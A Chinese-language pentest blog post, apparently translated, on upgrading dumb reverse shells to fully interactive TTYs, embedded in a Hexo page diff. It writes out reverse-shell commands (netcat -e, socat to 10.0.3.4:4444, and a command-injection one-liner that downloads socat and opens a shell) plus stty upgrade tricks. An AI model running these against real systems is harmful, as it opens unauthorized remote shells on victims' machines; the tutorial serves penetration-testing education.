@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fdlucifer.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":null,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="每个pentester都知道使用netcat获得反向shell并看到该ID的输出令人非常满意的冗长的netcat消息时，会感到非常惊奇。而且，如果其他渗透测试者像我一样，他们也知道失去shell时会感到害怕，因为运行了一个错误的命令，该命令挂起并意外打到“Ctrl-C”，以为它会停止它，但会kill整个连接。   除了不能正确处理SIGINT之外，这些“哑” shell还具有其他缺点：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="将simpleshell提升为全交互式的TTYshell">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="每个pentester都知道使用netcat获得反向shell并看到该ID的输出令人非常满意的冗长的netcat消息时，会感到非常惊奇。而且，如果其他渗透测试者像我一样，他们也知道失去shell时会感到害怕，因为运行了一个错误的命令，该命令挂起并意外打到“Ctrl-C”，以为它会停止它，但会kill整个连接。   除了不能正确处理SIGINT之外，这些“哑” shell还具有其他缺点：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/msfvenom_payloads.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/netcat_shell_cmd.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/perl_shell_cmd.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/python_pty.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/socat_tty.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/background_netcat.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/term_stty_info.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/fg_reset.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/netcat_full_tty.png">
+<meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/tmux_over_netcat-1.png">
+<meta property="article:published_time" content="2020-01-16T08:21:18.000Z">
+<meta property="article:modified_time" content="2020-08-16T17:01:55.685Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="linux提权">
+<meta property="article:tag" content="reverse tty shell">
+<meta property="article:tag" content="pentest">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png">
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>将simpleshell提升为全交互式的TTYshell | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lUc1f3r11's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">20</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">47</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+      <meta itemprop="description" content="all things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          将simpleshell提升为全交互式的TTYshell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-01-16 16:21:18" itemprop="dateCreated datePublished" datetime="2020-01-16T16:21:18+08:00">2020-01-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-17 01:01:55" itemprop="dateModified" datetime="2020-08-17T01:01:55+08:00">2020-08-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">linux提权</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux%E6%8F%90%E6%9D%83/reverse-tty-shell/" itemprop="url" rel="index"><span itemprop="name">reverse tty shell</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux%E6%8F%90%E6%9D%83/reverse-tty-shell/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li>每个pentester都知道使用netcat获得反向shell并看到该ID的输出令人非常满意的冗长的netcat消息时，会感到非常惊奇。而且，如果其他渗透测试者像我一样，他们也知道失去shell时会感到害怕，因为运行了一个错误的命令，该命令挂起并意外打到“Ctrl-C”，以为它会停止它，但会kill整个连接。</li>
+</ul>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png"></p>
+<p>除了不能正确处理SIGINT之外，这些“哑” shell还具有其他缺点：</p>
+<a id="more"></a>
+
+<ul>
+<li>某些命令（例如su和ssh）需要正确的终端才能运行</li>
+<li>通常不显示STDERR</li>
+<li>无法正确使用vim等文本编辑器</li>
+<li>没有完整制表符</li>
+<li>没有向上箭头的历史记录</li>
+<li>无工作控制</li>
+<li>等等…</li>
+</ul>
+<p>长话短说，虽然这些shell非常适合使用，但我宁愿在完全交互式的TTY中操作。</p>
+<p>我遇到了一些很好的资源，其中包括用于“升级”这些shell的非常有用的技巧和技术，并且希望在文章中进行编译和共享。还与Pentest Monkey一起，从菲尼亚斯·费舍尔（Phineas Fisher）的录像带和非法活动记录中学习了技巧：</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vSV9aaEZDUzNBUSN0PTI1bTUzcw==">Phineas Fisher Hacks Catalan Police Union Website Pt-1<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2Jsb2cvcG9zdC1leHBsb2l0YXRpb24td2l0aG91dC1hLXR0eQ==">Post-Exploitation Without A TTY<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h4 id="生成reverse-Shell"><a href="#生成reverse-Shell" class="headerlink" title="生成reverse Shell"></a>生成reverse Shell</h4><p>每个人都非常熟悉使用netcat获取反向shell的传统方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>问题是，不是每个服务器都安装了netcat，也不是每个版本的netcat都带有-e选项。</p>
+<p>Pentest Monkey的备忘单很棒</p>
+<p><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">Reverse Shell Cheat Sheet<i class="fa fa-external-link-alt"></i></span></p>
+<p>概述了几种不同的方法，但是我最喜欢的技术是使用Metasploit的msfvenom为我生成单行命令。<br>Metasploit在“cmd/unix”下有多个payload，可用于生成单线正向或反向shell：</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/msfvenom_payloads.png"></p>
+<p>这些payload中的任何一个都可以与msfvenom一起使用，以列出所需的原始命令（指定LHOST，LPORT或RPORT）。例如，这是一个不需要-e标志的netcat命令：</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/netcat_shell_cmd.png"></p>
+<p>这是一个Perl oneliner，以防未安装netcat的情况：</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/perl_shell_cmd.png"></p>
+<p>这些都可以通过使用netcat并监听指定的端口（4444）来捕获。</p>
+<h3 id="方法1：Python-pty模块"><a href="#方法1：Python-pty模块" class="headerlink" title="方法1：Python pty模块"></a>方法1：Python pty模块</h3><p>捕获一个笨拙的shell之后，很长一段时间以来一直使用的命令之一就是使用Python生成一个pty。<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3B0eS5odG1s">pty模块<i class="fa fa-external-link-alt"></i></span>产生一个psuedo-terminal，它可以使su之类的命令误认为它们是在适当的终端中执行的。要升级哑shell，只需运行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如，这将使您运行su（除了为您提供更好的提示之外）</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/python_pty.png"></p>
+<p>不幸的是，这不能解决上面概述的其他一些问题。SIGINT（Ctrl-C）仍将关闭Netcat，并且没有制表符完成或历史记录。但这是一个快速而又肮脏的解决方法，已为提供了无数次帮助。</p>
+<h3 id="方法2：使用socat"><a href="#方法2：使用socat" class="headerlink" title="方法2：使用socat"></a>方法2：使用socat</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy5kZXN0LXVucmVhY2gub3JnL3NvY2F0L2RvYy9zb2NhdC5odG1s">socat<i class="fa fa-external-link-alt"></i></span>就像类固醇上的netcat一样，是一种非常强大的网络瑞士军刀。Socat可用于通过TCP连接传递完整的TTY。</p>
+<p>如果在受害者服务器上安装了socat，则可以使用它启动reverse shell。还必须抓住与socat的连接才能获得全部功能。</p>
+<p>以下命令将产生完全交互式的TTY reverse shell：</p>
+<p>On Kali (listen):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
+
+<p>On Victim (launch):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
+
+<p>如果未安装socat，那么您的运气还不错。有一些独立的二进制文件可以从这个很棒的Github存储库中下载：</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuZHJldy1kL3N0YXRpYy1iaW5hcmllcw==">https://github.com/andrew-d/static-binaries<i class="fa fa-external-link-alt"></i></span></p>
+<p>使用命令注入漏洞，可以将正确的体系结构socat二进制文件下载到可写的Directoy，对其进行chmod，然后在一行中执行reverse shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://github.com/andrew<span class="_">-d</span>/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
+
+<p>在Kali上，您将获得一个完全交互式的TTY会话。它支持制表符补全，SIGINT/SIGSTP支持,vim,向上箭头历史记录等。它是一个完整的终端。很甜.</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/socat_tty.png"></p>
+<h3 id="方法3：使用magic从netcat升级"><a href="#方法3：使用magic从netcat升级" class="headerlink" title="方法3：使用magic从netcat升级"></a>方法3：使用magic从netcat升级</h3><p>我看到菲尼亚斯·费舍尔（Phineas Fisher）在他的黑客视频中使用了这种技术，感觉就像魔术一样。基本上，可以通过在您的Kali终端中设置一些stty选项来使用哑的netcat shell升级到完整的TTY。首先，遵循与方法1中相同的技术，并使用Python生成PTY。一旦bash在PTY中运行，请使用Ctrl-Z后台shell</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/background_netcat.png"></p>
+<p>当shell处于后台时，现在检查当前的终端和STTY信息，以便可以强制连接的shell匹配它：</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/term_stty_info.png"></p>
+<p>所需的信息是TERM类型（“ xterm-256color”）和当前TTY的大小（“行38；列116”）在shell仍然处于背景中的情况下，现在将当前的STTY设置为raw类型，并使用以下命令告诉它回显输入的字符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+
+<p>具有原始风格，输入/输出看起来很奇怪，您不会看到下一个命令，但是当您键入它们时，它们正在被处理。接下来用fg前置shell。它将重新打开reverse shell，但是格式将关闭。最后，使用重置重新初始化终端。</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/fg_reset.png"></p>
+<p>注意：我没有再次键入nc命令（如上图所示）。我实际上输入了fg，但是没有回显。nc命令是现在处于前台的作业。然后将reset命令输入到netcat shell中</p>
+<p>重置后，shell应再次看起来正常。最后一步是设置shell，终端类型和样式大小以匹配当前的Kali窗口（来自上面收集的信息）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SHELL=bash</span><br><span class="line"><span class="built_in">export</span> TERM=xterm256-color</span><br><span class="line">stty rows 38 columns 116</span><br></pre></td></tr></table></figure>
+
+<p>最终结果是一个完全交互式的TTY，它通过netcat连接具有我们期望的所有功能（选项卡完成，历史记录，作业控制等）：</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/netcat_full_tty.png"></p>
+<p>现在的可能性是无止境的。在netcat shell上的Tmux？为什么不？：D</p>
+<p><img src="https://blog.ropnop.com/content/images/2017/07/tmux_over_netcat-1.png"></p>
+<h3 id="tl-dr速查表"><a href="#tl-dr速查表" class="headerlink" title="tl; dr速查表"></a>tl; dr速查表</h3><p>备忘单命令：</p>
+<ul>
+<li>使用Python作为伪终端</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用socat</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Listener:</span></span><br><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br><span class="line"></span><br><span class="line"><span class="comment">#Victim:</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用样式选项</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Enjoy!</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://fdlucifer.github.io/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/" title="将simpleshell提升为全交互式的TTYshell">https://fdlucifer.github.io/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag"># linux提权</a>
+              <a href="/tags/reverse-tty-shell/" rel="tag"># reverse tty shell</a>
+              <a href="/tags/pentest/" rel="tag"># pentest</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/01/13/WinterMute-1/" rel="prev" title="vulnhub靶机渗透[WinterMute-1]">
+      <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[WinterMute-1]
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/20/View2aKill/" rel="next" title="vulnhub靶机渗透[View2aKill]">
+      vulnhub靶机渗透[View2aKill] <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90reverse-Shell"><span class="nav-number">1.</span> <span class="nav-text">生成reverse Shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9APython-pty%E6%A8%A1%E5%9D%97"><span class="nav-number"></span> <span class="nav-text">方法1：Python pty模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E4%BD%BF%E7%94%A8socat"><span class="nav-number"></span> <span class="nav-text">方法2：使用socat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E4%BD%BF%E7%94%A8magic%E4%BB%8Enetcat%E5%8D%87%E7%BA%A7"><span class="nav-number"></span> <span class="nav-text">方法3：使用magic从netcat升级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tl-dr%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number"></span> <span class="nav-text">tl; dr速查表</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
